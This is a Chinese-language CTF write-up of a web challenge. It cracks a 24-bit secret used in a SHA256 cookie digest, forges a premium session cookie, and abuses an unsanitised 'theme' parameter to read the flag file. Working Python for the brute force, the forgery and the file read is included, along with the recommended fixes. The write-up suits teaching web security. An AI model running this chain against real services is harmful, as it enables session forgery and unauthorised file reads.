# pay-to-win

## 题目简述

登录 cookie 包含 Base64 JSON `data` 和摘要 `hash`。服务端为每个用户名生成 `hex(random.getrandbits(24))[2:]` 作为秘密，并验证

$$
\operatorname{SHA256}(\text{data}\Vert\text{secret}).
$$

秘密只有 24 位，可以离线穷举。伪造 `user_type=premium` 后，premium 页面还会把 `theme` 参数作为文件路径直接 `open`，形成任意文件读取。

## 解题过程

先正常登录取得一组有效 cookie。遍历 $2^{24}$ 个候选，注意服务使用不补前导零的 Python `hex(i)[2:]` 表示：

```python
import base64
import hashlib
import json
import requests

session = requests.Session()
session.post("https://TARGET/login", data={"username": "solver"}, timeout=10)
data = session.cookies["data"]
digest = session.cookies["hash"]

secret = None
for value in range(1 << 24):
    candidate = hex(value)[2:]
    test = hashlib.sha256((data + candidate).encode()).hexdigest()
    if test == digest:
        secret = candidate
        break
assert secret is not None
```

重新编码 premium JSON 并计算合法摘要，再令主题指向 Dockerfile 中的 flag 路径：

```python
payload = {"username": "solver", "user_type": "premium"}
forged_data = base64.b64encode(json.dumps(payload).encode()).decode()
forged_hash = hashlib.sha256((forged_data + secret).encode()).hexdigest()

page = requests.get(
    "https://TARGET/?theme=/secret-flag-dir/flag.txt",
    cookies={"data": forged_data, "hash": forged_hash},
    timeout=10,
).text
print(page[page.index("tjctf{"):page.index("}", page.index("tjctf{")) + 1])
```

得到：

```text
tjctf{not_random_enough_64831eff}
```

## 方法总结

- 服务端随机值即使不直接返回，若熵只有 24 位且存在已知消息摘要，也能被完全离线穷举。
- 伪造 premium 只是第一阶段；真正的秘密读取来自把用户控制的主题名直接交给 `open`。
- 修复应使用高熵会话密钥和标准认证 cookie，同时把主题限制为固定标识到受控文件的映射。
